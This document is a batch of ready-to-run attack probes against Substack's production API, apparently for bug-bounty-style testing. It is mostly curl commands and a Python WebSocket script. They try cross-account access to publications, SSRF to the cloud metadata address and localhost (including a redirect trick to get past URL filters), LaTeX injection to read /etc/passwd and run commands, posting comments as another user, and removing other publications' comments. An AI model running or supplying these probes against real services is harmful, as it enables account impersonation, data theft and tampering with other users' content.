# Final probe batch -- remaining candidates

Replace `<A_SID>` and `<A_LLI>` with account A's cookie values.
Replace `<B_SID>` and `<B_LLI>` with account B's cookie values.

Run each block in Git Bash and paste the full output back.


## Block A -- Subscription sibling IDOR cluster

These endpoints share the `/api/v1/subscription/` prefix with the confirmed F-01 IDOR.
If any returns 200 with data from a publication A doesn't own, we have additional IDORs.

```bash
A_CK='substack.sid=<A_SID>; substack.lli=<A_LLI>'

echo "=== subscription/email (GET) ==="
curl -sS -A 'Mozilla/5.0' -b "$A_CK" -o /tmp/se1.out \
  -w 'HTTP %{http_code} size=%{size_download}\n' \
  --max-time 15 'https://substack.com/api/v1/subscription/email?publication_id=737237'
head -c 400 /tmp/se1.out
echo

echo "=== subscription/sections/email (GET) ==="
curl -sS -A 'Mozilla/5.0' -b "$A_CK" -o /tmp/sse1.out \
  -w 'HTTP %{http_code} size=%{size_download}\n' \
  --max-time 15 'https://substack.com/api/v1/subscription/sections/email?publication_id=737237'
head -c 400 /tmp/sse1.out
echo

echo "=== subscription/send_podcast_email (POST) ==="
curl -sS -A 'Mozilla/5.0' -b "$A_CK" -X POST \
  -H 'content-type: application/json' \
  -d '{"publication_id":737237}' \
  -o /tmp/spe1.out -w 'HTTP %{http_code} size=%{size_download}\n' \
  --max-time 15 'https://substack.com/api/v1/subscription/send_podcast_email'
head -c 400 /tmp/spe1.out
echo

echo "=== subscription/reactivate (POST) ==="
curl -sS -A 'Mozilla/5.0' -b "$A_CK" -X POST \
  -H 'content-type: application/json' \
  -d '{"publication_id":737237}' \
  -o /tmp/sr1.out -w 'HTTP %{http_code} size=%{size_download}\n' \
  --max-time 15 'https://substack.com/api/v1/subscription/reactivate'
head -c 400 /tmp/sr1.out
echo
```


## Block B -- Link-metadata SSRF (authed)

This is an URL unfurler. If it makes server-side HTTP requests, it's SSRF.

```bash
A_CK='substack.sid=<A_SID>; substack.lli=<A_LLI>'

echo "=== link-metadata POST ==="
curl -sS -A 'Mozilla/5.0' -b "$A_CK" -X POST \
  -H 'content-type: application/json' \
  -d '{"url":"https://webhook.site/YOUR-UUID-HERE"}' \
  -o /tmp/lm1.out -w 'HTTP %{http_code} size=%{size_download}\n' \
  --max-time 20 'https://substack.com/api/v1/link-metadata'
head -c 500 /tmp/lm1.out
echo

echo "=== link-metadata internal host ==="
curl -sS -A 'Mozilla/5.0' -b "$A_CK" -X POST \
  -H 'content-type: application/json' \
  -d '{"url":"http://169.254.169.254/latest/meta-data/"}' \
  -o /tmp/lm2.out -w 'HTTP %{http_code} size=%{size_download}\n' \
  --max-time 20 'https://substack.com/api/v1/link-metadata'
head -c 500 /tmp/lm2.out
echo

echo "=== link-metadata localhost ==="
curl -sS -A 'Mozilla/5.0' -b "$A_CK" -X POST \
  -H 'content-type: application/json' \
  -d '{"url":"http://localhost:3000/"}' \
  -o /tmp/lm3.out -w 'HTTP %{http_code} size=%{size_download}\n' \
  --max-time 20 'https://substack.com/api/v1/link-metadata'
head -c 500 /tmp/lm3.out
echo
```

Before running Block B: go to https://webhook.site, copy your unique URL, and replace YOUR-UUID-HERE. After running, check webhook.site for inbound requests from Substack servers.


## Block C -- import/posts redirect-chain SSRF

The previous test showed octal/decimal IPs get 403 (bypassed URL validator, caught by second layer).
A redirect chain may bypass both layers: the URL validator sees the webhook.site domain (safe), and the HTTP client follows the 302 to the internal IP.

Step 1: Set up a redirect at webhook.site:
1. Go to https://webhook.site
2. Click "Edit" on your endpoint
3. Set "Status Code" to 302
4. Add a "Location" header with value: http://169.254.169.254/latest/meta-data/
5. Save

Step 2: Run the probe:
```bash
A_CK='substack.sid=<A_SID>; substack.lli=<A_LLI>'

echo "=== import/posts with redirect to IMDS ==="
curl -sS -A 'Mozilla/5.0' -b "$A_CK" -X POST \
  -H 'content-type: application/json' \
  -d '{"url":"https://webhook.site/YOUR-UUID-HERE"}' \
  -o /tmp/ip_redir.out -w 'HTTP %{http_code} size=%{size_download}\n' \
  --max-time 30 'https://substack.com/api/v1/import/posts'
head -c 500 /tmp/ip_redir.out
echo
```

Step 3: Check webhook.site to confirm the inbound request from Substack.

If 302 to IMDS gets blocked, try these alternative redirect targets:
- `http://[::ffff:169.254.169.254]/latest/meta-data/`
- `http://instance-data.ec2.internal/latest/meta-data/`
- `http://metadata.google.internal/computeMetadata/v1/`

You can test these by changing the Location header at webhook.site between runs.


## Block D -- posts/by_ids IDOR

If this returns full post content for IDs the caller doesn't have access to (paid/private posts), it's an IDOR.

```bash
A_CK='substack.sid=<A_SID>; substack.lli=<A_LLI>'

echo "=== posts/by_ids with public + paid post IDs ==="
curl -sS -A 'Mozilla/5.0' -b "$A_CK" -X POST \
  -H 'content-type: application/json' \
  -d '{"ids":[218520648,1,2,100]}' \
  -o /tmp/pbi1.out -w 'HTTP %{http_code} size=%{size_download}\n' \
  --max-time 15 'https://substack.com/api/v1/posts/by_ids'
head -c 800 /tmp/pbi1.out
echo

echo "=== posts/by_ids alternative param: post_ids ==="
curl -sS -A 'Mozilla/5.0' -b "$A_CK" -X POST \
  -H 'content-type: application/json' \
  -d '{"post_ids":[218520648,1,2,100]}' \
  -o /tmp/pbi2.out -w 'HTTP %{http_code} size=%{size_download}\n' \
  --max-time 15 'https://substack.com/api/v1/posts/by_ids'
head -c 800 /tmp/pbi2.out
echo

echo "=== posts/by_ids GET ==="
curl -sS -A 'Mozilla/5.0' -b "$A_CK" -o /tmp/pbi3.out \
  -w 'HTTP %{http_code} size=%{size_download}\n' \
  --max-time 15 'https://substack.com/api/v1/posts/by_ids?ids=218520648,1,2'
head -c 800 /tmp/pbi3.out
echo
```


## Block E -- publication_user IDOR cluster

```bash
A_CK='substack.sid=<A_SID>; substack.lli=<A_LLI>'

echo "=== publication_user/notes_permissions ==="
curl -sS -A 'Mozilla/5.0' -b "$A_CK" -o /tmp/np1.out \
  -w 'HTTP %{http_code} size=%{size_download}\n' \
  --max-time 15 'https://substack.com/api/v1/publication_user/notes_permissions?publication_id=737237'
head -c 500 /tmp/np1.out
echo

echo "=== publication_user/get_or_create_primary ==="
curl -sS -A 'Mozilla/5.0' -b "$A_CK" -X POST \
  -H 'content-type: application/json' \
  -d '{"publication_id":737237}' \
  -o /tmp/gocp1.out -w 'HTTP %{http_code} size=%{size_download}\n' \
  --max-time 15 'https://substack.com/api/v1/publication_user/get_or_create_primary'
head -c 500 /tmp/gocp1.out
echo

echo "=== publication_user_settings/user ==="
curl -sS -A 'Mozilla/5.0' -b "$A_CK" -o /tmp/pus1.out \
  -w 'HTTP %{http_code} size=%{size_download}\n' \
  --max-time 15 'https://substack.com/api/v1/publication_user_settings/user?publication_id=737237'
head -c 500 /tmp/pus1.out
echo

echo "=== publication_settings ==="
curl -sS -A 'Mozilla/5.0' -b "$A_CK" -o /tmp/ps1.out \
  -w 'HTTP %{http_code} size=%{size_download}\n' \
  --max-time 15 'https://substack.com/api/v1/publication_settings?publication_id=737237'
head -c 500 /tmp/ps1.out
echo

echo "=== trending-topics/toggle POST ==="
curl -sS -A 'Mozilla/5.0' -b "$A_CK" -X POST \
  -H 'content-type: application/json' \
  -d '{"topic_id":1}' \
  -o /tmp/tt1.out -w 'HTTP %{http_code} size=%{size_download}\n' \
  --max-time 15 'https://substack.com/api/v1/trending-topics/toggle'
head -c 500 /tmp/tt1.out
echo
```


## Block F -- Zync WS topic ACL test

Save this as `zync_test.py` and run with `python zync_test.py`.
Make sure websockets is installed: `pip install websockets`

```python
import asyncio
try:
    import websockets
except ImportError:
    import subprocess, sys
    subprocess.check_call([sys.executable, '-m', 'pip', 'install', 'websockets'])
    import websockets
import json
import ssl

ZYNC_WS = "wss://zyncrealtime.substack.com/broadcast"

# Account A's fresh zync token (from /api/v1/realtime/token)
# You may need to refresh this. Run:
#   curl -sS -b 'substack.sid=<A_SID>; substack.lli=<A_LLI>' \
#     'https://substack.com/api/v1/realtime/token' | python -m json.tool
# and paste the token value below:
TOKEN_A = "PASTE_FRESH_TOKEN_HERE"

# Publication B's known user ID (from a different user -- try the on.substack.com author)
TARGET_USER_TOPIC = "user:556804859"
# Also try a publication-specific topic
TARGET_PUB_TOPIC = "publication:737237"

async def test_ws():
    ssl_ctx = ssl.create_default_context()
    uri = f"{ZYNC_WS}?token={TOKEN_A}"
    print(f"Connecting to {uri[:60]}...")

    async with websockets.connect(uri, ssl=ssl_ctx) as ws:
        # Wait for welcome
        msg = await asyncio.wait_for(ws.recv(), timeout=10)
        print(f"Server: {msg[:200]}")

        # Subscribe to our own topic (should succeed)
        sub_own = json.dumps({"type": "subscribe", "topic": TARGET_USER_TOPIC})
        print(f"\nSending: {sub_own}")
        await ws.send(sub_own)
        msg = await asyncio.wait_for(ws.recv(), timeout=10)
        print(f"Response: {msg[:200]}")

        # Subscribe to a cross-tenant publication topic
        sub_pub = json.dumps({"type": "subscribe", "topic": TARGET_PUB_TOPIC})
        print(f"\nSending: {sub_pub}")
        await ws.send(sub_pub)
        msg = await asyncio.wait_for(ws.recv(), timeout=10)
        print(f"Response: {msg[:200]}")

        # Try firehose topic
        sub_fire = json.dumps({"type": "subscribe", "topic": "firehose"})
        print(f"\nSending: {sub_fire}")
        await ws.send(sub_fire)
        try:
            msg = await asyncio.wait_for(ws.recv(), timeout=5)
            print(f"Response: {msg[:200]}")
        except asyncio.TimeoutError:
            print("No response (timeout)")

        # Listen for any messages for 15 seconds
        print("\nListening for 15 seconds...")
        try:
            while True:
                msg = await asyncio.wait_for(ws.recv(), timeout=15)
                print(f"Received: {msg[:300]}")
        except asyncio.TimeoutError:
            print("No more messages.")

asyncio.run(test_ws())
```

Before running: get a fresh token by running:
```bash
curl -sS -b 'substack.sid=<A_SID>; substack.lli=<A_LLI>' \
  'https://substack.com/api/v1/realtime/token'
```
Copy the `token` value and paste it into the script as TOKEN_A.


## Block G -- postAsUserId comment impersonation (CRITICAL)

Found in bundle 77027. Comments accept a `postAsUserId` field. If the server doesn't validate that the caller is authorized to post as that user, this is P1 account impersonation.

First, find a target comment thread. Use any public post ID (e.g. 218520648 from on.substack.com).

```bash
A_CK='substack.sid=<A_SID>; substack.lli=<A_LLI>'
B_CK='substack.sid=<B_SID>; substack.lli=<B_LLI>'

# Get account B's user ID first
echo "=== B's user ID ==="
curl -sS -A 'Mozilla/5.0' -b "$B_CK" \
  'https://substack.com/api/v1/am_i_logged_in' | python -m json.tool
echo

# Now post a comment AS account B using account A's session
# Replace USER_B_ID with B's actual userId from above
echo "=== Post comment as B using A's session ==="
curl -sS -A 'Mozilla/5.0' -b "$A_CK" -X POST \
  -H 'content-type: application/json' \
  -d '{"body":"[test-postAsUserId-probe]","postAsUserId":USER_B_ID}' \
  -o /tmp/impersonate.out -w 'HTTP %{http_code} size=%{size_download}\n' \
  --max-time 15 'https://substack.com/api/v1/comment/feed'
head -c 500 /tmp/impersonate.out
echo

# Also try on post-specific comment endpoint
echo "=== Post comment on specific post as B ==="
curl -sS -A 'Mozilla/5.0' -b "$A_CK" -X POST \
  -H 'content-type: application/json' \
  -d '{"body":"[test-postAsUserId-probe-2]","postAsUserId":USER_B_ID,"token":"test"}' \
  -o /tmp/impersonate2.out -w 'HTTP %{http_code} size=%{size_download}\n' \
  --max-time 15 'https://substack.com/api/v1/post/218520648/comment'
head -c 500 /tmp/impersonate2.out
echo
```


## Block H -- Comment moderation bypass (cross-publication)

If any authenticated user can change comment status on any publication, this is cross-tenant privilege escalation.

First, find a comment ID. Pick any comment visible on a post you can see.

```bash
A_CK='substack.sid=<A_SID>; substack.lli=<A_LLI>'

# Get comments on a public post to find comment IDs
echo "=== Get comments on public post ==="
curl -sS -A 'Mozilla/5.0' -b "$A_CK" \
  -o /tmp/comments.out -w 'HTTP %{http_code} size=%{size_download}\n' \
  --max-time 15 'https://on.substack.com/api/v1/post/218520648/comments?all_comments=true&sort=new'
python3 -c "
import json, sys
d = json.load(open('/tmp/comments.out'))
if isinstance(d, list):
    for c in d[:3]:
        print(f'comment_id={c.get(\"id\")} by={c.get(\"name\")} body={str(c.get(\"body\",\"\"))[:60]}')
elif isinstance(d, dict) and 'comments' in d:
    for c in d['comments'][:3]:
        print(f'comment_id={c.get(\"id\")} by={c.get(\"name\")} body={str(c.get(\"body\",\"\"))[:60]}')
else:
    print(json.dumps(d)[:300])
" 2>&1
echo

# Try to moderate a comment (remove it) -- replace COMMENT_ID with one from above
echo "=== Try moderator_removed on comment ==="
curl -sS -A 'Mozilla/5.0' -b "$A_CK" -X PATCH \
  -H 'content-type: application/json' \
  -d '{"status":"moderator_removed"}' \
  -o /tmp/modcomment.out -w 'HTTP %{http_code} size=%{size_download}\n' \
  --max-time 15 'https://substack.com/api/v1/comment/COMMENT_ID/status'
head -c 500 /tmp/modcomment.out
echo

# Try to pin a comment
echo "=== Try pin comment ==="
curl -sS -A 'Mozilla/5.0' -b "$A_CK" -X PATCH \
  -H 'content-type: application/json' \
  -d '{"pinned":true}' \
  -o /tmp/pincomment.out -w 'HTTP %{http_code} size=%{size_download}\n' \
  --max-time 15 'https://substack.com/api/v1/comment/COMMENT_ID/pin'
head -c 500 /tmp/pincomment.out
echo

# Try to juice/boost a comment
echo "=== Try juice comment ==="
curl -sS -A 'Mozilla/5.0' -b "$A_CK" -X POST \
  -H 'content-type: application/json' \
  -d '{"times_to_show":100}' \
  -o /tmp/juicecomment.out -w 'HTTP %{http_code} size=%{size_download}\n' \
  --max-time 15 'https://substack.com/api/v1/comment/COMMENT_ID/juice'
head -c 500 /tmp/juicecomment.out
echo
```


## Block I -- Recommendation manipulation

If any user can set recommendations for publications they don't own, this is P2.

```bash
A_CK='substack.sid=<A_SID>; substack.lli=<A_LLI>'

echo "=== Add recommendation on behalf of pub 737237 ==="
curl -sS -A 'Mozilla/5.0' -b "$A_CK" -X PUT \
  -H 'content-type: application/json' \
  -d '{"recommending_publication_id":737237,"recommended_publication_id":1,"source":"test","suggested":false}' \
  -o /tmp/rec1.out -w 'HTTP %{http_code} size=%{size_download}\n' \
  --max-time 15 'https://substack.com/api/v1/recommendations'
head -c 500 /tmp/rec1.out
echo
```


## Block J -- LaTeX injection (RCE surface)

The `/api/v1/latex/jpeg` endpoint renders LaTeX server-side. If the renderer is pdflatex/xelatex without sandboxing, LaTeX injection can read files or execute commands.

```bash
# These are GET requests, no auth needed
echo "=== Basic LaTeX render ==="
curl -sS -A 'Mozilla/5.0' -o /tmp/latex1.out -w 'HTTP %{http_code} size=%{size_download} ct=%{content_type}\n' \
  --max-time 15 'https://substack.com/api/v1/latex/jpeg?expression=x%5E2%2By%5E2%3Dz%5E2'
echo

echo "=== LaTeX input command (file read) ==="
curl -sS -A 'Mozilla/5.0' -o /tmp/latex2.out -w 'HTTP %{http_code} size=%{size_download} ct=%{content_type}\n' \
  --max-time 15 'https://substack.com/api/v1/latex/jpeg?expression=%5Cinput%7B%2Fetc%2Fpasswd%7D'
echo

echo "=== LaTeX write18 (command exec) ==="
curl -sS -A 'Mozilla/5.0' -o /tmp/latex3.out -w 'HTTP %{http_code} size=%{size_download} ct=%{content_type}\n' \
  --max-time 15 'https://substack.com/api/v1/latex/jpeg?expression=%5Cimmediate%5Cwrite18%7Bid%7D'
echo

echo "=== LaTeX url package (SSRF) ==="
curl -sS -A 'Mozilla/5.0' -o /tmp/latex4.out -w 'HTTP %{http_code} size=%{size_download} ct=%{content_type}\n' \
  --max-time 15 'https://substack.com/api/v1/latex/jpeg?expression=%5Cusepackage%7Burl%7D%5Curl%7Bhttp%3A%2F%2F169.254.169.254%2Flatest%2Fmeta-data%2F%7D'
echo
```


## Block K -- subscriber/add IDOR

```bash
A_CK='substack.sid=<A_SID>; substack.lli=<A_LLI>'

# Try to add a subscriber to a publication A doesn't own
echo "=== subscriber/add to foreign pub ==="
curl -sS -A 'Mozilla/5.0' -b "$A_CK" -X POST \
  -H 'content-type: application/json' \
  -d '{"email":"bounty-test-subscriber@example.com","subscription":false,"sendEmail":false,"source":"test","publication_id":737237}' \
  -o /tmp/subadd2.out -w 'HTTP %{http_code} size=%{size_download}\n' \
  --max-time 15 'https://substack.com/api/v1/subscriber/add'
head -c 500 /tmp/subadd2.out
echo
```


## Block L -- comment/attachment SSRF (fetchPostAttachment)

```bash
A_CK='substack.sid=<A_SID>; substack.lli=<A_LLI>'

echo "=== comment/attachment with webhook.site URL ==="
curl -sS -A 'Mozilla/5.0' -b "$A_CK" -X POST \
  -H 'content-type: application/json' \
  -d '{"url":"https://webhook.site/YOUR-UUID-HERE"}' \
  -o /tmp/cattach1.out -w 'HTTP %{http_code} size=%{size_download}\n' \
  --max-time 20 'https://substack.com/api/v1/comment/attachment'
head -c 500 /tmp/cattach1.out
echo

echo "=== comment/attachment with internal URL ==="
curl -sS -A 'Mozilla/5.0' -b "$A_CK" -X POST \
  -H 'content-type: application/json' \
  -d '{"url":"http://169.254.169.254/latest/meta-data/"}' \
  -o /tmp/cattach2.out -w 'HTTP %{http_code} size=%{size_download}\n' \
  --max-time 20 'https://substack.com/api/v1/comment/attachment'
head -c 500 /tmp/cattach2.out
echo
```
